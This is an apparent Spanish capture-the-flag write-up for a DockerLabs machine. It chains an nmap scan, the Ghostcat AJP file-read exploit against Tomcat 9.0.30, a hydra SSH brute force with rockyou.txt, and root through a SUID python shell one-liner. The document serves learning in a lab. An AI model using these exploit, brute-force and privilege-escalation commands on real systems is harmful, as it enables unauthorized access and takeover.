# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/beb5f8b2-02cf-4757-8f58-b95467733ca2)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp(SSH):** OpenSSH 7.9p1 (Debian)
2. **8009/tcp(ajp13):** Apache Jserv
3. **8080/tcp(HTTP):** Apache Tomcat 9.0.30
### Puerto 80
Al identificar que el puerto 8080 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador con el puerto y es una pagina de Apache Tomcat.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/476032a4-99c0-4285-834f-ff5f1f69d16d)

# Fase 2- Exploración

#### Feroxbuster

No encontramos nada interesante.

#### 9.0.30
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/0bc8ae97-f93d-4729-8e91-3467bccab9a6)
Vemos que la versión de Tomcat 9.0.30...


![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4ae0602d-f6a2-4840-9773-82d2e0167308)
Encontramos un exploit en GitHub, que permite leer archivos internos.

# Fase 3- Explotación

#### GitHub = Jesus
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/70ca1c99-cf42-456c-ae4e-3f66fc91529e)
```python
python2 CVE-2020-1938.py 172.17.0.2 -p 8009 -f WEB-INF/web.xml
```
Le indicamos la ip, el puerto y el archivo que queremos leer.

```python
Getting resource at ajp13://172.17.0.2:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat, Jerry ;)
  </description>

</web-app>
```
En el archivo vemos un posible usuario `Jerry`.

#### Hydra
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6efa09d4-5571-4bfc-ad9f-98a98b845f17)
Encontramos la contraseña del usuario: `chocolate`. Utilizando hydra.
Comando:
```python
sudo hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
```

# Fase 4- Privilegios

#### find
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/704a0939-57c9-41b3-aee5-ca48eedd151a)
Despues de hacer el tratamiento de la TTY. Vemos que tenemos permisos de python y perl.

#### Python
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fc97a024-cf9f-4c8a-8e7a-596ed731dc4a)
Vemos que para elevar privilegios tenemos que ejecutar el comando:
```python
/usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5d95d825-48ac-444d-8f90-4ad09eb11b34)
Y somos root!


